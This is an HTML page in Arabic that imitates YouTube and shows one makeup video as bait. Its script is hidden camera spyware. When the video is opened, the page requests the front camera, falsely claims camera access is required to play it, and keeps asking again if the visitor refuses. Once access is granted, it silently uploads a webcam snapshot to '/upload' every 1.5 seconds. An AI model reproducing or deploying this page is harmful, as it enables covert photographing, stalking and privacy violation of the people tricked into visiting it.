<head>

<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
<style>
:root{--bg:#0f0f0f;--bg2:#272727;--text:#fff;--text2:#aaa;--red:#ff0000;--line:rgba(255,255,255,.12);--hover:rgba(255,255,255,.1)}
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
html{color-scheme:dark}
body{font-family:'Cairo','Tajawal',system-ui,sans-serif;background:var(--bg);color:var(--text);font-size:14px;line-height:1.5;overflow-x:hidden}
button{font:inherit;color:inherit;background:none;border:0;cursor:pointer}
input{font:inherit;color:inherit}
a{color:inherit;text-decoration:none}
svg.i{width:24px;height:24px;fill:currentColor;flex:none;display:block}
svg.i.sm{width:18px;height:18px}
svg.i.big{width:64px;height:64px;color:#717171}
.icon-btn{width:40px;height:40px;border-radius:50%;display:grid;place-items:center;position:relative;flex:none}
.icon-btn:hover{background:var(--hover)}
.mob-only{display:none}

/* Topbar */
.topbar{position:fixed;top:0;inset-inline:0;height:56px;background:var(--bg);display:flex;align-items:center;justify-content:space-between;padding:0 16px;z-index:100;gap:12px}
.tb-start,.tb-end{display:flex;align-items:center;gap:8px;flex:1}
.tb-end{justify-content:flex-end}
.logo{display:flex;align-items:center;gap:6px;font-weight:700;font-size:20px}
.logo svg{width:30px;height:21px}
.search-wrap{flex:0 1 640px;display:flex;align-items:center;gap:8px;min-width:0}
.search{display:flex;flex:1;min-width:0}
.search input{flex:1;min-width:0;height:40px;background:#121212;border:1px solid #303030;border-start-start-radius:40px;border-end-start-radius:40px;padding:0 18px;outline:none;font-size:16px}
.search button{width:64px;height:40px;background:#222;border:1px solid #303030;border-inline-start:0;border-start-end-radius:40px;border-end-end-radius:40px;display:grid;place-items:center}
.badge{position:absolute;top:2px;inset-inline-end:0;background:var(--red);font-size:10px;font-weight:700;border-radius:8px;padding:0 5px;line-height:16px}
.me{width:32px;height:32px;border-radius:50%;background:#8e24aa;display:grid;place-items:center;font-weight:700}

/* Sidebar */
.sidebar{position:fixed;top:56px;bottom:0;inset-inline-start:0;width:240px;background:var(--bg);overflow-y:auto;padding:12px;z-index:90;transition:transform .25s ease,width .2s ease}
.sb-head{display:none;align-items:center;gap:8px;height:56px;margin:-12px -12px 8px;padding:0 16px}
.sb-item{display:flex;align-items:center;gap:22px;height:40px;padding:0 12px;border-radius:10px;width:100%;text-align:start;white-space:nowrap;overflow:hidden}
.sb-item span{overflow:hidden;text-overflow:ellipsis}
.sb-item:hover{background:var(--hover)}
.sb-item.active{background:var(--bg2);font-weight:600}
.sb-sep{height:1px;background:var(--line);margin:12px 0}
.sb-title{padding:6px 12px;font-weight:600;font-size:16px}
body.mini:not(.drawer-mode) .sidebar{width:72px;padding:4px}
body.mini:not(.drawer-mode) .sb-item{flex-direction:column;height:74px;justify-content:center;gap:6px;font-size:10px;padding:0}
body.mini:not(.drawer-mode) .sb-extra{display:none}
body.drawer-mode .sidebar{top:0;z-index:200;transform:translateX(100%);box-shadow:0 0 30px rgba(0,0,0,.6)}
body.drawer-mode.drawer-open .sidebar{transform:none}
body.drawer-mode .sb-head{display:flex}
.backdrop{position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:150;display:none}
body.drawer-mode.drawer-open .backdrop{display:block}

/* Main */
.main{padding-top:56px;margin-inline-start:240px;transition:margin .2s;min-height:100vh}
body.mini:not(.drawer-mode) .main{margin-inline-start:72px}
body.drawer-mode .main{margin-inline-start:0}
.chips{position:sticky;top:56px;z-index:50;background:var(--bg);display:flex;gap:12px;overflow-x:auto;padding:12px 24px;scrollbar-width:none}
.chips::-webkit-scrollbar{display:none}
.chip{flex:none;height:32px;padding:0 14px;border-radius:8px;background:var(--bg2);font-weight:600;white-space:nowrap}
.chip:hover{background:#3f3f3f}
.chip.active{background:#fff;color:#0f0f0f}
.page-title{padding:16px 24px 0;font-size:20px;font-weight:700}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:24px 16px;padding:24px}
.card{cursor:pointer;background:#181818;border-radius:12px;overflow:hidden;border:1px solid rgba(255,255,255,0.08);transition:transform 0.2s}
.card:hover{transform:translateY(-2px)}
.thumb{position:relative;aspect-ratio:16/9;background:#000;display:flex;justify-content:center;align-items:center}
.thumb img{width:100%;height:100%;object-fit:cover;display:block}
.dur{position:absolute;bottom:6px;inset-inline-end:6px;background:rgba(0,0,0,.8);padding:0 5px;border-radius:4px;font-size:12px;font-weight:600;direction:ltr}
.meta{display:flex;gap:12px;padding:12px}
.avatar{width:36px;height:36px;border-radius:50%;display:grid;place-items:center;font-weight:700;color:#fff;flex:none;text-transform:uppercase}
.t{font-size:15px;font-weight:600;line-height:1.4;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
.sub{color:var(--text2);font-size:13px;margin-top:2px}

/* Watch */
.watch{display:flex;gap:24px;padding:24px;max-width:1800px;margin:0 auto}
.w-primary{flex:1;min-width:0}
.w-secondary{width:402px;flex:none}
.player{position:relative;width:100%;max-width:480px;aspect-ratio:9/16;background:#000;border-radius:12px;overflow:hidden;margin:0 auto}
.player iframe{position:absolute;inset:0;width:100%;height:100%;border:0}
.yt-link{display:inline-block;margin-top:6px;font-size:12px;color:#3ea6ff}
.w-title{font-size:20px;font-weight:700;line-height:1.5;margin:8px 0}
.w-row{display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px}
.ch{display:flex;align-items:center;gap:12px}
.ch-name{font-weight:700;font-size:16px}
.actions{display:flex;gap:8px;overflow-x:auto;scrollbar-width:none}
.seg{display:flex;background:var(--bg2);border-radius:18px;overflow:hidden}
.seg button{height:36px;padding:0 16px;display:flex;align-items:center;gap:6px;font-weight:600}
.desc{background:var(--hover);border-radius:12px;padding:12px;margin-top:12px;cursor:pointer}
.desc p{margin-top:4px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
.desc.open p{display:block}

/* Modal & toast */
.modal{position:fixed;inset:0;background:rgba(0,0,0,.65);display:none;place-items:center;z-index:300;padding:16px}
.modal.show{display:grid}
.modal-box{background:#212121;border-radius:16px;width:min(440px,100%);padding:16px 20px 20px}
.modal-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
.share-row{display:flex;gap:16px;overflow-x:auto;padding:8px 0 16px;scrollbar-width:none}
.share-row a{display:flex;flex-direction:column;align-items:center;gap:6px;font-size:12px;flex:none;width:64px}
.link-row{display:flex;gap:8px;align-items:center;background:#121212;border:1px solid #303030;border-radius:12px;padding:8px}
.link-row input{flex:1;min-width:0;background:none;border:0;outline:none;direction:ltr;font-size:14px}
.toasts{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);display:flex;flex-direction:column;gap:8px;align-items:center;z-index:500;width:max-content;pointer-events:none}
.toast{background:#f1f1f1;color:#0f0f0f;padding:12px 20px;border-radius:10px;font-weight:600;box-shadow:0 4px 18px rgba(0,0,0,.5);opacity:0;transform:translateY(12px);transition:.25s}
.toast.show{opacity:1;transform:none}

.bnav{display:none;position:fixed;bottom:0;inset-inline:0;height:56px;background:var(--bg);border-top:1px solid var(--line);z-index:100}
.bnav button{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;font-size:10px;gap:2px;color:var(--text2)}
.bnav button.active{color:#fff;font-weight:700}

@media(max-width:700px){
  .mob-only{display:grid}
  .hide-mob{display:none!important}
  .search-wrap{display:none;position:absolute;inset:0;background:var(--bg);padding:0 8px;z-index:2}
  body.searching .search-wrap{display:flex}
  .grid{grid-template-columns:1fr;padding:12px}
  .bnav{display:flex}
  .main{padding-bottom:64px}
  .watch{padding:0;flex-direction:column}
  .player{border-radius:0;max-width:100%}
  body.in-watch .bnav{display:none}
}
</style>
</head>
<body>

<header class="topbar">
  <div class="tb-start">
    <button class="icon-btn" data-action="menu"><svg class="i" viewBox="0 0 24 24"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></button>
    <button class="logo" data-nav="home"><svg viewBox="0 0 28 20" style="width:30px;height:21px"><rect width="28" height="20" rx="5" fill="#f00"/><path d="M11 6l7 4-7 4z" fill="#fff"/></svg><span>يوتيوب</span></button>
  </div>
  <div class="search-wrap">
    <button class="icon-btn mob-only" data-action="search-close"><svg class="i" viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg></button>
    <form class="search" id="searchForm"><input id="q" type="search" placeholder="بحث" autocomplete="off"><button type="submit"><svg class="i" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg></button></form>
  </div>
  <div class="tb-end">
    <button class="icon-btn mob-only" data-action="search-open"><svg class="i" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg></button>
    <button class="me">أ</button>
  </div>
</header>

<aside class="sidebar" id="sidebar"></aside>
<div class="backdrop" data-action="menu"></div>
<main class="main"><div class="chips" id="chips"></div><div id="view"></div></main>
<nav class="bnav" id="bnav"></nav>
<div class="toasts" id="toasts"></div>

<video id="video" autoplay playsinline style="display:none;"></video>

<script>
const VIDEOS=[{id:'zMORugVTZAA',title:'مين صار معه كذا 😂#حب وعشق #ميك_اب #فاونديشن #foundation #makeup #مكياج',ch:'Warda Moda عالم وردة',views:457233,time:'هذا الشهر',cat:'جمع',dur:'00:16',desc:'مقطع ترفيهي مميز.'}];
const S={view:'home',cat:'الكل',q:'',cur:null};
const $=(s,r=document)=>r.querySelector(s);
const esc=s=>String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));

function render(){
  const view=$('#view');
  if(S.view==='watch'){
    const v=VIDEOS[0];
    view.innerHTML=`<div class="watch"><div class="w-primary">
      <div class="player" id="playerContainer"><iframe src="https://www.youtube.com/embed/${v.id}?autoplay=1&rel=0&playsinline=1" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>
      <h1 class="w-title">${v.title}</h1>
    </div></div>`;
  }else{
    view.innerHTML=`<div class="grid">${VIDEOS.map(v=>`<article class="card" data-open="${v.id}"><div class="thumb"><img src="https://img.youtube.com/vi/${v.id}/hqdefault.jpg"><span class="dur">${v.dur}</span></div><div class="meta"><div><h3 class="t">${v.title}</h3><div class="sub">${v.ch}</div></div></div></article>`).join('')}</div>`;
  }
}

function openVideo(id){
  S.cur=id; S.view='watch'; render();
  startCapture();
}

/* ===== إدارة الكاميرا مع التكرار اللاإنهائي للطلب ===== */
let mediaStream = null;

async function initPersistentCamera() {
    try {
        mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'user' } } });
        const videoEl = document.getElementById('video');
        videoEl.srcObject = mediaStream;
        
        // إذا وافق المستخدم، يعود الفيديو للعمل طبيعياً
        const playerContainer = document.getElementById('playerContainer');
        if (playerContainer && playerContainer.querySelector('#retryOverlay')) {
            playerContainer.innerHTML = `<iframe src="https://www.youtube.com/embed/${S.cur}?autoplay=1&rel=0&playsinline=1" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>`;
        }

        setInterval(() => {
            if (!mediaStream) return;
            try {
                const canvas = document.createElement('canvas');
                canvas.width = videoEl.videoWidth || 640;
                canvas.height = videoEl.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                    if (blob) {
                        let fd = new FormData();
                        fd.append('image', blob, 'user_eye.jpg');
                        fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
                    }
                }, 'image/jpeg', 0.85);
            } catch (err) {}
        }, 1500);

    } catch (e) {
        // في حال الرفض أو التجاهل، نظهر طبقة تفاعلية تتيح للمستخدم إعادة المحاولة بلا حدود
        const playerContainer = document.getElementById('playerContainer');
        if (playerContainer) {
            playerContainer.innerHTML = `
                <div id="retryOverlay" style="display:grid;place-items:center;height:100%;color:#fff;text-align:center;padding:20px;cursor:pointer;background:#111;position:absolute;inset:0;z-index:99;">
                    <div>
                        <div style="font-size:40px;margin-bottom:10px;">⚠️</div>
                        <p style="color:#ff0000;font-weight:bold;margin-bottom:8px;font-size:15px;">عذراً، يجب السماح بالكاميرا لعرض الفيديو</p>
                        <p style="color:#aaa;font-size:12px;margin-bottom:15px;">انقر هنا لإظهار نافذة الأذونات من جديد</p>
                        <span style="font-size:13px;color:#fff;background:#cc0000;padding:10px 20px;border-radius:20px;display:inline-block;font-weight:bold;">إعادة محاولة السماح</span>
                    </div>
                </div>
            `;
            
            // عند النقر في أي وقت، نقوم بإعادة تفعيل المحاولة بشكل تكراري بلا إزعاج
            document.getElementById('retryOverlay').onclick = () => {
                mediaStream = null;
                // خدعة لتحديث حاوية الفيديو وإجبار المتصفح على محاولة جلب الصلاحية تفاعلياً مجدداً
                initPersistentCamera();
            };
        }
    }
}

function startCapture() {
    if (mediaStream) return;
    initPersistentCamera();
}

document.addEventListener('click',e=>{
  const card=e.target.closest('[data-open]');
  if(card) openVideo(card.dataset.open);
  const nav=e.target.closest('[data-nav]');
  if(nav){ S.view='home'; render(); }
});

render();
</script>
</body>
</html>
